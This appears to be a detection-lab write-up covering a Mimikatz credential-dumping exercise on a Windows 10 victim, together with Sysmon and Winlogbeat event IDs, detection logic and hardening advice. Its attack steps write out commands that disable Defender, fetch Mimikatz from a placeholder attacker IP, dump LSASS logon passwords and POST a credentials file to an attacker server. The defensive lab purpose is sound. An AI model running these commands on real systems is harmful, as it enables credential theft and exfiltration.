### 🛡️ Task: Credential Dumping and Exfiltration via Mimikatz

---

## 📘 Scenario Summary

This task demonstrates a credential dumping attack using **Mimikatz** on a Windows machine. The goal is to extract credentials from **LSASS** memory and simulate **data exfiltration over HTTPS**, observing behavior through **Sysmon**, **Winlogbeat**, and **Elasticsearch/Kibana**.

---

## 🧪 Lab Setup

* **Attacker Machine**: Kali Linux
* **Victim Machine**: Windows 10 (Home or Pro)
* **Connectivity**: Bridged adapter (same network)
* **Monitoring Tools**: Sysmon + Winlogbeat + Elasticsearch + Kibana (already configured)

---

## 🛠️ Tools Required

* [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
* Sysmon (for Event ID 10 - process access)
* Netcat, curl or PowerShell (for exfiltration simulation)

---

## 🔥 Steps to Perform Attack

### 🔹 Step 1: Disable Defender (optional)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 🔹 Step 2: Download and Extract Mimikatz

Use browser or PowerShell to download the zipped build:

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>:8080/mimikatz.zip" -OutFile "$env:USERPROFILE\Downloads\mimikatz.zip"
Expand-Archive "$env:USERPROFILE\Downloads\mimikatz.zip" -DestinationPath "C:\Temp\mimikatz"
```

### 🔹 Step 3: Run Mimikatz and Dump Credentials

```cmd
cd C:\Temp\mimikatz
mimikatz.exe
sekurlsa::logonpasswords
```

### 🔹 Step 4: Simulate Exfiltration

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>:8080/upload" -Method POST -Body (Get-Content .\creds.txt)
```

Or:

```powershell
Invoke-RestMethod -Uri "https://<attacker-server>/receive" -Method POST -Body "dumped credentials"
```

---

## 📊 Detection Focus

### 📁 Sysmon Event IDs

| Event ID | Description                  |
| -------- | ---------------------------- |
| 10       | lsass.exe access by mimikatz |
| 1        | Process creation of mimikatz |
| 3        | Network connection           |

### 📁 Winlogbeat Event IDs

| Event ID | Description  |
| -------- | ------------ |
| 4624     | Logon events |

---

## 🔍 Detection Logic

* **Process Creation**: mimikatz.exe, powershell.exe calling web resources
* **Sysmon ID 10**: Access to `lsass.exe` by unauthorized process
* **Outbound HTTP/HTTPS POST** from non-browser apps (PowerShell, cmd)

---

## 🛡️ Mitigation & Hardening

* Enable Credential Guard
* Restrict debug privileges
* Block known hacking tools using AppLocker
* Use endpoint detection and response (EDR)

---

## 📌 Status

| Field               | Value               |
| ------------------- | ------------------- |
| 🧪 Detection Logic  | ✅ Confirmed working |
| 📈 Data Visibility  | ✅ Shown in Kibana   |
| 💬 Exfil Simulation | ✅ Via PowerShell    |
| 🧰 Tool Used        | Mimikatz            |

---
